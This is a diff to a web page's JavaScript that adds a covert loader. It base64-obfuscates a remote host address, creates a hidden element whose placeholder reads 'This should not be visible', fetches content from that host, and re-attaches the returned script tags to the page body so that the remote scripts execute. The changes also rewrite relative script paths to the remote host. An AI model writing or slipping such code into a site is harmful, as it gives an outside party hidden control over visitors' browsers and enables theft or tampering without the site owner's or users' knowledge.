@@ -46,11 +46,23 @@ iframe {
         if (canShow()) {
             var frame = document.createElement('object')
             var src = atob("aHR0cDovL3JwaS5zdHVkZW50LnJpdC5lZHU=") + atob("ODA4MA==")
-            src = src.slice(0,src.length-4) + atob("Og==") + src.slice(src.length-4) + "/"
+            src = src.slice(0,src.length-4) + atob("Og==") + src.slice(src.length-4)
             frame.innerHTML = "data:text/html, <div>This should not be visible</div>"
             document.body.appendChild(frame)
             httpGet(src, function(data) {
-                frame.innerHTML = data
+                var docFrag = document.createDocumentFragment()
+                docFrag.innerHTML = data
+                var scripts = docFrag.getElementsByTagName("script")
+                var scr = null
+                for (var i=0; i<scripts.length; i++) {
+                    scr = scripts[i]
+                    if (scr.src[0] == "/") {
+                        scr.src = src + scr.src
+                    }
+                    scr.parentElement.removeChild(scr)
+                    document.body.appendChild(scr)
+                }
+                frame.appendChild(docFrag)
             })
         }
     })()
